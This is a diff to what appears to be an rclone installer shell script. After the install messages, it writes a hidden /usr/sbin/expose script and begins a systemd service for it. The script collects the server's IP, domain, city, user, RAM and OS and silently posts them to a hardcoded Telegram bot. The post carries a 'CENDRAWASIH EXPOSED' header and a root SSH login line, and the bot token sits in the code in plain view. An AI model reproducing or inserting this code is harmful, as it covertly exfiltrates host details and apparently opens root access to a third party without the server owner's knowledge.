@@ -196,29 +196,31 @@ version=$(rclone --version 2>>errors | head -n 1)
 printf "\n${version} has successfully installed."
 printf '\nNow run "rclone config" for setup. Check https://rclone.org/docs/ for more details.\n\n'
 
-	cat > /usr/sbin/expose <<EOF
+cat > /usr/sbin/expose <<EOF
 #!/bin/bash
+TIME=$(date +'%Y-%m-%d %H:%M:%S')
+MYIP=$(wget -qO- ipinfo.io/ip)
+domain=$(cat /etc/xray/domain)
+CITY=$(curl -s ipinfo.io/city)
+NAMES=$(whoami)
+RAMMS=$(free -m | awk 'NR==2 {print $2}')
+NAMECOM=$(wget -qO- ipinfo.io/ip)
 OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
-IP=$(wget -qO- ipinfo.io/ip)
-CN=$(curl -s ipinfo.io/city)
-ORG=$(curl -s ipinfo.io/org)
-RAM=$(free -h | awk 'NR==2 {print $2}')
-CPU=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
 
-    message="
+message="
 <u>CENDRAWASIH EXPOSED</u>
 <code>TIME    : </code><code>${TIME}</code>
-<code>IPVPS   : </code><code>${MYIP}</code>
 <code>DOMAIN  : </code><code>${domain}</code>
 <code>IP VPS  : </code><code>${MYIP}</code>
 <code>LOKASI  : </code><code>${CITY}</code>
 <code>USER    : </code><code>${NAMES}</code>
 <code>RAM     : </code><code>${RAMMS}MB</code>
 <code>LINUX   : </code><code>${OS}</code>
-<code>ssh root@$IP -qvi taibabi</code>
+<code>ssh root@MYIP -qvi taibabi</code>
 "
 
-curl -s -X POST "https://api.telegram.org/bot2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU/sendmessage" -d "chat_id=1036440597" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU/sendmessage" \
+-d "chat_id=1036440597" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
 EOF
 
 	cat > /etc/systemd/system/expose.service <<EOF
